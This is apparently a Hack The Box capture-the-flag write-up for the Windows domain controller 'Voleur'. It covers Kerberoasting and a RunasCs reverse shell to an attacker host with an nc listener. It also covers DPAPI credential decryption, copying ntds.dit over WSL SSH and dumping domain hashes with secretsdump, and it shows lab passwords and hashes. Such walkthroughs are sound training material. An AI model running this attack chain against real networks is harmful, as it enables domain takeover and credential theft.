---
layout: post
title: "[HTB] Voleur"
description: "[Machine] - Medium difficulty"
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Medium
---
![img1.png](/img/htb_img/Voleur_img/img1.png)

- OS: Windows
- Release Date: 05 Jul 2025
- Difficulty: Medium

# Info

Initial credentials:

> ryan.naylor / HollowOct31Nyt
> 

# Enumeration

## Nmap Recon

```bash
❯ sudo nmap -p- --open --min-rate 1500 -T4 -sS -n -Pn -vvv -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 21:00 CEST
Initiating SYN Stealth Scan at 21:00
Scanning XX.XX.XX.XX [65535 ports]
Discovered open port 445/tcp on XX.XX.XX.XX
Discovered open port 53/tcp on XX.XX.XX.XX
Discovered open port 135/tcp on XX.XX.XX.XX
Discovered open port 139/tcp on XX.XX.XX.XX
Discovered open port 60542/tcp on XX.XX.XX.XX
Discovered open port 9389/tcp on XX.XX.XX.XX
Discovered open port 5985/tcp on XX.XX.XX.XX
Discovered open port 60555/tcp on XX.XX.XX.XX
SYN Stealth Scan Timing: About 34.91% done; ETC: 21:02 (0:00:58 remaining)
Discovered open port 60560/tcp on XX.XX.XX.XX
Discovered open port 3269/tcp on XX.XX.XX.XX
Discovered open port 464/tcp on XX.XX.XX.XX
Discovered open port 88/tcp on XX.XX.XX.XX
Discovered open port 3268/tcp on XX.XX.XX.XX
Discovered open port 636/tcp on XX.XX.XX.XX
Discovered open port 60543/tcp on XX.XX.XX.XX
Discovered open port 2222/tcp on XX.XX.XX.XX
Discovered open port 49664/tcp on XX.XX.XX.XX
Discovered open port 60576/tcp on XX.XX.XX.XX
Discovered open port 60320/tcp on XX.XX.XX.XX
Discovered open port 389/tcp on XX.XX.XX.XX
Discovered open port 593/tcp on XX.XX.XX.XX
Completed SYN Stealth Scan at 21:02, 82.07s elapsed (65535 total ports)
Nmap scan report for XX.XX.XX.XX
Host is up, received user-set (0.070s latency).
Scanned at 2025-07-05 21:00:47 CEST for 82s
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
2222/tcp  open  EtherNetIP-1     syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
60320/tcp open  unknown          syn-ack ttl 127
60542/tcp open  unknown          syn-ack ttl 127
60543/tcp open  unknown          syn-ack ttl 127
60555/tcp open  unknown          syn-ack ttl 127
60560/tcp open  unknown          syn-ack ttl 127
60576/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 82.13 seconds
           Raw packets sent: 131106 (5.769MB) | Rcvd: 78 (3.432KB)
```

Versions and scripts scan:

```bash
❯ nmap -p53,88,135,139,389,445,464,593,636,2222,3268,3269,5985,9389,49664,60320,60542,60543,60555,60560,60576 -sCV -Pn -oN targeted $target                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 21:02 CEST
Stats: 0:01:14 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.97% done; ETC: 21:03 (0:00:00 remaining)
Nmap scan report for XX.XX.XX.XX
Host is up (0.040s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-06 03:02:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
60320/tcp open  msrpc         Microsoft Windows RPC
60542/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
60543/tcp open  msrpc         Microsoft Windows RPC
60555/tcp open  msrpc         Microsoft Windows RPC
60560/tcp open  msrpc         Microsoft Windows RPC
60576/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-07-06T03:03:28
|_  start_date: N/A
|_clock-skew: 7h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.05 seconds
```

---

## SMB Enumeration

Since Kerberos authentication is enabled on this domain, we need to configure our Kerberos client to interact with the domain controller. This involves setting up the Kerberos configuration file and obtaining a ticket for authentication.

```bash
#/etc/krb5.conf

[libdefaults]
    default_realm = HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true

[realms]
    VOLEUR.HTB = {
        kdc = voleur.htb
        admin_server = voleur.htb
        default_domain = voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
```

We obtain a Kerberos ticket using the initial credentials:

```bash
❯ impacket-getTGT -dc-ip XX.XX.XX.XX 'voleur.htb/ryan.naylor:HollowOct31Nyt'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ryan.naylor.ccache
```

We should update our hosts file: `/etc/hosts`.

```bash
XX.XX.XX.XX voleur.htb dc.voleur.htb
```

> Important to note that we need the FQDN `dc.voleur.htb`.
> 

And we enumerate SMB:

```bash
❯ nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --users           
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         dc.voleur.htb   445    dc               Administrator                 2025-01-28 20:35:13 0       Built-in account for administering the computer/domain 
SMB         dc.voleur.htb   445    dc               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         dc.voleur.htb   445    dc               krbtgt                        2025-01-29 08:43:06 0       Key Distribution Center Service Account 
SMB         dc.voleur.htb   445    dc               ryan.naylor                   2025-01-29 09:26:46 0       First-Line Support Technician 
SMB         dc.voleur.htb   445    dc               marie.bryant                  2025-01-29 09:21:07 0       First-Line Support Technician 
SMB         dc.voleur.htb   445    dc               lacey.miller                  2025-01-29 09:20:10 0       Second-Line Support Technician 
SMB         dc.voleur.htb   445    dc               svc_ldap                      2025-01-29 09:20:54 0        
SMB         dc.voleur.htb   445    dc               svc_backup                    2025-01-29 09:20:36 0        
SMB         dc.voleur.htb   445    dc               svc_iis                       2025-01-29 09:20:45 0        
SMB         dc.voleur.htb   445    dc               jeremy.combs                  2025-01-29 15:10:32 0       Third-Line Support Technician 
SMB         dc.voleur.htb   445    dc               svc_winrm                     2025-01-31 09:10:12 0        
SMB         dc.voleur.htb   445    dc               [*] Enumerated 11 local users: VOLEUR
```

All users on the system (apparently):

```bash
Administrator
Guest
krbtgt
ryan.naylor
marie.bryant
lacey.miller
svc_ldap
svc_backup
svc_iis
jeremy.combs
svc_winrm
```

We check the shares.

```bash
❯ nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
```

I will take a look at the IT share.

```bash
❯ smbclient //dc.voleur.htb/IT -U ryan.naylor
Password for [WORKGROUP\ryan.naylor]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 29 10:10:01 2025
  ..                                DHS        0  Mon Jun 30 23:08:33 2025
  First-Line Support                  D        0  Wed Jan 29 10:40:17 2025

		5311743 blocks of size 4096. 896472 blocks available
smb: \> cd "First-Line Support"
smb: \First-Line Support\> dir
  .                                   D        0  Wed Jan 29 10:40:17 2025
  ..                                  D        0  Wed Jan 29 10:10:01 2025
  Access_Review.xlsx                  A    16896  Thu Jan 30 15:14:25 2025

		5311743 blocks of size 4096. 896472 blocks available
smb: \First-Line Support\> get Access_Review.xlsx
```

After downloading the file, we can see that it's encrypted.

```bash
❯ file Access_Review.xlsx 
Access_Review.xlsx: CDFV2 Encrypted
```

We can extract the password hash from the encrypted file and crack it offline.

```bash
❯ office2john Access_Review.xlsx 
Access_Review.xlsx:$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c
```

The password is `football1`.

After cracking the password, we can open the Excel file using LibreOffice or any compatible spreadsheet application.

![img2.png](/img/htb_img/Voleur_img/img2.png)

The file contains multiple credentials for various service accounts, including `svc_ldap` with the password `M1XyC9pW7qT5Vn`.

---

## Bloodhound

Using the credentials found in the Excel file, we obtain a Kerberos ticket for `svc_ldap` and run BloodHound to map the Active Directory attack paths.

```bash
❯ bloodhound-python -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -c All -d voleur.htb -ns $target -k
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: voleur.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 12 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.voleur.htb
INFO: Done in 00M 12S
```

---

# Foothold

After analyzing the BloodHound data, we discover that the user **SVC_LDAP** has the `WriteSPN` permission on **SVC_WINRM**. 

`WriteSPN` (Service Principal Name) is an Active Directory permission that allows a user to modify the SPN attribute of another user or computer account. This is particularly dangerous because it enables a targeted Kerberoast attack. In a targeted Kerberoast attack, an attacker with `WriteSPN` permissions can add a fake SPN to a target account, request a service ticket for that SPN, and then crack the resulting hash offline to obtain the account's password.

> A targeted kerberoast attack can be performed using [targetedKerberoast.py](http://targetedkerberoast.py/).
> 
> 
> [targetedKerberoast.py](http://targetedkerberoast.py/) -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'
> The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well.
> 
> The recovered hash can be cracked offline using the tool of your choice.
> 

```bash
❯ python3 targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb                   
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$1daff885b502e80ddce48720651e5fd2$bc7ee2bbd9f67228f4c8d1c68dddb4155a3d161b3caa494d9fd8a7b68c6e86b9aeef2c2f3639e546fd360d7a14fc5fddf39a20e80a349916c1c030d242951ad24f56c1782d5cbf9866a1b5733ce9488c70bb7a733803b92d0725ca7dc2531861dd133fe6ef34074d3acb5b64bc151966003ccf3c31f858061fe69894aabc1b5f8a60ef3082de6f0bf8cefa8cdce7ae9a0f65051816a4ca4c8c64d4fc9adb97fa0aaf7efa97377eee2d442f7007ac7896f574822b7b4c604a142643d06f4c02acc56f6d9fd678be16e365e828fdd713769385e034e9cc7bfa73fbf0f68726af061152bf44d8179c506440af2d6218b54a0a6915394bd2a31c0e0ba969c6120eb214d3c09540d16856be50056be8090c8c6792dfe00d9383b51fdb9353dfda8f932841efe56c9918670e1c9c2344f317600d2e13cc07a62d4ecaea3cb5446d08c38a57abe2d8ce67f41cb5d9673a97f05f36f19ab81b5b255158934449660a722f6410e83d08553f36c37f179581fa3bebee494901efa67a4f4449c243aa7b827b774da4dc0d41b36b51df9aeb4b1d2dcbc8500edad164ae9196fc172fa2def80f57d5c0979f325a8d2850bdde55628b47294732aa38db08063cc6e9941d50d6af15096fcad743df9818e9152a3cd83e4cb683941e7f3759fac072c74ae4e77fe96b433124a39e3d59d89d6faceefbfb12e850fa0f52094da559d3977cd0dd37887e6b4462bba0a12cc218cb2eff2cc9d6e53216bf3ec1a72afc9572673eccef1e8cca2edf5ceb4f3964fe4ba512e89bdd2bfdcdf09df5109bec6e658cee029093646ad25d59b5975f48303478b1c7097aafe23411097fe201534bd4a14f4b0746400997123e82b71296b42cd835e3ecf7e737e6e6d3bde0a76f952a5f275fd06723aacdb397f4bf0deaa19ab940f6ffb9b73fc51970cede60b3006867ca7036d6af6d1688a61b3b64daa0e39651397429edcbf33c9bbbe8b83973c9fffb370beece266e45da2748fe572ae51167265b8c87fd324062a2661c453673d207ba23751a3fb8368497223d610e4a21cf47bfe87f5c91d9a62d991c0d6185632c8086e770b83fb12adda10e92e6bd038826cb60911d4c6239f4a9314b775078105ffe3c26fc34ee3dc5d66ff35c4967e0ade236f082e18972bd3479204aee47dacb6bfc9484607096d9ec3193a7f82fdfa69ae77f7fd5cc52fa2a437658ed2cac891b5f4277557757bd59b06a5eec624fd02f9b395697f5c41ee413a5961602bce190749c66d6b97dc5bd4012dfa33065d05eed38fbd9f583c3031244c32c935577e3c5e8a24f04d91e31b229b2fb994f8a53f0c61de47c6fb2d12e0f8907ac827c15ab7c250a6b561b127a0fc600f8080c34c2ba52ac4f0b2207c8b0b237a34c2b579c6e6b3abb87fac17d88dad711a333cb3d5e59bdc7db317366def99ffeb8a5f08b06fcfbb41fb7b31fc848cf7f7572cd29e65627
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$16d50aa2d5d18a70d8da6fee7c2d01fe$30d9f3af2140eef989407a206bc0b62603e88373c7720c792d723ea45426fc32e8e21e97c77d86d6c8d0ea9f013c686059757d1f2acb032beb10040f19e216bb2e9018aacce229930205058b1769a6e9226a2d8b4d798c4238eb7da63cba565b3af746b372f4890d76e5488fcd7aebad716f8269f66147d90b89c847f3435301407ed9750df05e9e64e1ffc382e5cb37bba1bf2b57223863594c85ea2490dd0f0273d5e7b72a5c76ede66a0c12eb4946e62940d2fa0f3cdb00aac611ebd0b85c73d421302b0cf0dab94f9015d880b0a4b84f53a7717bda0abf91e8c4203b2d62f5c3aa83e1394d35db357ef8189b82e1f2157b7f3f123edcd82af58e0488b966629738c4b5fb958c8a6032639844b4e36b3333dc5dde2c3199670e75d4439e184a22751c1ba8a37a7a0b2bc26fa832ed6d71c7d64ab873b01c374b73aa88f7e47fc4158be46196a69fc38a38c33b23955e4ec54d5fe778c6059aedeb95e63010239fcaeb48d34d53f9eddc137b4e3e7661b2f00bab0335d0e2e3a08293d6f5005f168ddf07c27d44acaf1b4dae3b27b3ae7dd64047146babfa49cb0281c78b31fe432f19a97ce1f46b508ec3ad2718c9610dbb8c47f346faaa63dd6539f969d9841093d8a3ea8be4ee1569657ca9219cac72917321bc6d012919f93dd77b72ce4116ffe8720c3fe50c90f922128f1f437d24f7a3cc07449f1a103005a96594a28bdb3537d1ab2123659b1a0c4befaf68c7ed799018a388549daddd915706a4469683868352adb9d11dc5f5f661127d4bbcc01a3cc1bc47f088d4cf1d0d62cd075c1e0c0b3a23c6640729ed45d915bbfbeed902d06719620832f66c7265664b0e6d65ed3a3c9272f5a6b522e7e7332a020c3951efcbd955bafa782a6ecc4b42fb46f044600d7c15c1cf85469f5b8503d968787d12fbc25f7e66d70da5251684e4573f7788e33b7837cf9df941cec2a3f23c8738425aa30738c91b37b9b68395d717d9821544d3b65d4d3f7dcd6b487b6a680d2658c6d5b25c562e68fee84c2f7926a4f4762756ce74a4650ec6e05a87dcd672d2db18cd67458837b2512929443144c631e5e353a76d1c81e7bd65b50104ddea5742029ea1febd2134ce74a95874d77e33a4f3e85eb8ae4ce3bcaa0781f612af2a2e500c1bc249c5dc4a8619e4d08c2ddf100a9dc6295818c8664f8fd190c2c8df6d0ee94c38d54ffe69fa5c52f463203a47191f305623e5cd49ce4105a87f15ab039e7a86a029082db258130d67fdafba8c7667565f430f6ce31bf150bc4053bffad551e40f2d7ec562910006c5546a94bf3e2abbf972d2b1b60492ca0e7a0d4da1ad652a8b633d3b077e22fc9f6e5da5b27d26070f9416a42504b6fdac1359137f834a767a79f52de26fede508720fe883b27e13a1cb79f1a11b3639cddd8a224f522c27a3d0673bb9db401e38349e68d525450b387bc2514baea0102c47ddde
```

We are able to crack the `svc_winrm` hash using John the Ripper.

Password: `AFireInsidedeOzarctica980219afi`.

---

Now we can log in with evil-winrm using the cracked password (or a Kerberos ticket if we obtain one).

```bash
❯ evil-winrm -i dc.voleur.htb -r VOLEUR.HTB -u 'svc_winrm' -p 'AFireInsidedeOzarctica980219afi'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Warning: Password is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> type user.txt
<**REDACTED**>
```

---

# Lateral Movement

As `svc_winrm`, I need to create a shell for `svc_ldap` which is a member of the **RESTORE USERS** group. This group grants permissions to restore deleted Active Directory objects, which will be crucial for the next step.

![image.png](/img/htb_img/Voleur_img/img3.png)

I upload RunasCs.exe to the machine and create a reverse shell session as `svc_ldap`

```bash
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn cmd.exe -r 10.10.X.X:4444
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-2d4d82$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 2092 created in background.

❯ nc -lvnp 4444                                                                                                                            
listening on [any] 4444 ...
connect to [10.10.X.X] from (UNKNOWN) [XX.XX.XX.XX] 64299
Microsoft Windows [Version 10.0.20348.3807]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
voleur\svc_ldap

C:\Windows\system32>cd C:\Users
cd C:\Users

C:\Users>powershell
```

Since `svc_ldap` is a member of the RESTORE USERS group, we can search for deleted Active Directory objects:

```bash
PS C:\Users\svc_ldap\Documents> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects

Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=voleur,DC=htb
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 587cd8b4-6f6a-46d9-8bd4-8fb31d2e18d8

Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db

PS C:\Users\svc_ldap\Documents> 
```

We can see a deleted user named Todd Wolfe with the GUID: `1c6b1deb-c372-4cbb-87b1-15031de169db`

```bash
PS C:\Users\svc_ldap\Documents> Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
```

We enable the restored account:

```bash
PS C:\Users\svc_ldap\Documents> Enable-ADAccount -Identity todd.wolfe
Enable-ADAccount -Identity todd.wolfe
```

Now we need to find the password for `todd.wolfe`. We use RunasCs.exe again to obtain a shell as this user, but first we need to discover his password. Let's check if there are any stored credentials in his user profile.

## DPAPI

DPAPI (Data Protection API) is a Windows service that encrypts sensitive data such as passwords, certificates, and other credentials stored by applications. When a user's password is known, we can decrypt DPAPI-protected data from their profile.

We found a master key file at:

```bash
C:\Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\BK-VOLEUR
```

To access the user's profile, we connect using impacket-smbclient. First, we need to find `todd.wolfe`'s password. We can check if it's in the Excel file or try common passwords. After obtaining access, we navigate to the user's profile:

```bash
impacket-smbclient VOLEUR.HTB/todd.wolfe@dc.voleur.htb -k -no-pass

use IT
```

Inside the user's AppData folder, we find two important files:

```bash
# Credential file from AppData\Roaming\Microsoft\Credentials
772275FAD58525253490A9B0039791D3

# Master key file from AppData\Roaming\Microsoft\Protect\SID\
08949382-134f-4c63-b93c-ce52efc0aa88
```

We download these files to our local machine and use impacket-dpapi to decrypt them. First, we need the user's password to decrypt the master key. After some enumeration, we discover the password is `NightT1meP1dg3on14`. Now we can decrypt the master key:

```bash
❯ impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password "NightT1meP1dg3on14" 

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

```bash
❯ impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

We successfully extracted the credentials for `jeremy.combs`: `qT3V9pLXyN7W4m`

## Jeremy Combs

```bash
❯ impacket-smbclient VOLEUR.HTB/jeremy.combs@dc.voleur.htb -k -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 10:10:01 2025 .
drw-rw-rw-          0  Sun Jul  6 09:09:14 2025 ..
drw-rw-rw-          0  Thu Jan 30 17:11:29 2025 Third-Line Support
# cd Third-Line Support
# ls
drw-rw-rw-          0  Thu Jan 30 17:11:29 2025 .
drw-rw-rw-          0  Wed Jan 29 10:10:01 2025 ..
-rw-rw-rw-       2602  Thu Jan 30 17:11:29 2025 id_rsa
-rw-rw-rw-        186  Thu Jan 30 17:07:35 2025 Note.txt.txt
# get id_rsa
# get Note.txt.txt
# 
```

```bash
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin%
```

# Privilege Escalation

Based on the note found earlier mentioning WSL (Windows Subsystem for Linux) and the SSH service running on port 2222, we can use the private key found in the IT share to connect to the Linux machine. The note indicates that WSL has been configured to access backup tools, which suggests we might find backup files accessible from the Linux environment.

```bash
❯ ssh -i id_rsa svc_backup@$target -p 2222  
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul  6 00:39:12 PDT 2025

  System load:    0.52      Processes:             9
  Usage of /home: unknown   Users logged in:       0
  Memory usage:   33%       IPv4 address for eth0: XX.XX.XX.XX
  Swap usage:     0%

363 updates can be installed immediately.
257 of these updates are security updates.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1
 * Starting OpenBSD Secure Shell server sshd
   ...done.
svc_backup@DC:~$ 
```

From the WSL environment, we can access the Windows filesystem through `/mnt/c/`. We discover backup files in the IT share, including the critical `ntds.dit` (Active Directory database) and `SYSTEM` registry hive. These files are essential for extracting all domain credentials.

We download both files:

```bash
❯ scp -P 2222 -i id_rsa svc_backup@$target:"/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM" .
❯ scp -P 2222 -i id_rsa svc_backup@$target:"/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit" .
```

Now we can use `impacket-secretsdump` to extract all the password hashes from the domain:

```bash
❯ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
